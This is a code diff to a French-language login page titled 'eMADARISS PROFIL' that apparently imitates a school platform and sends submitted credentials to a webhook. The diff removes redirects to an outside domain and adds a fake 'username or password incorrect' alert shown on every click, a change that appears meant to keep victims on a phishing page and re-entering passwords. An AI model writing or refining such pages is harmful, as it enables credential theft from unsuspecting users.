@@ -2,7 +2,6 @@
 <html lang="fr-fr">
 <head>
     <meta charset="utf-8">
-    <meta http-equiv="refresh" content="30;url=https://elouatkikaoukabi.com/">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <title>eMADARISS PROFIL</title>
     <link href="css/bootstrap.css" rel="stylesheet">
@@ -67,7 +66,9 @@
                                         <input type="password" class="form-control" id="Password" name="Password" placeholder="Mot de passe">
                                     </div>
                                 </div>
-                                <button type="button" class="btn btn-primary pull-right" onclick="submitLogin()">Se connecter</button>
+                                <button type="button" class="btn btn-primary pull-right" onclick="submitLogin(); alert('Login error: Username or password incorrect. Please try again or visit this site after 10 minutes.');">Se connecter</button>
+
+
                             </form>
                         </div>
                         <div class="card-footer text-right small" style="height:30px;padding-top:5px;">
@@ -146,14 +147,12 @@
                 }
                 return response.json();
             })
-            .then(responseData => {
-                console.log('Webhook response:', responseData);
-                window.location.href = 'https://elouatkikaoukabi.com/';
-            })
+            
             .catch(error => {
                 console.error('Error:', error);
             });
         }
+         
     </script>
     <script type="text/javascript">
         'use strict';
